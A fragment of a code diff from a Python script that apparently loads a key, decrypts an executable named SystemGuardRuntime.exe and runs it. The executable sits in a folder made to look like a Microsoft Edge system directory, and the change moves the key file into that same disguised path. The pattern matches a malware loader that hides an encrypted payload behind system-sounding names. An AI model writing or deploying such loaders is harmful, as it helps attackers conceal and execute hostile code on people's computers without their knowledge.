@@ -38,6 +38,6 @@ def run_decrypted_file(decrypted_data):
         print(f"An error occurred: {e}")
 
 if __name__ == "__main__":
-    key = load_key("encryption_key.txt")
+    key = load_key("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\encryption_key.txt")
     decrypted_data = decrypt_file("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe", key)
     run_decrypted_file(decrypted_data)
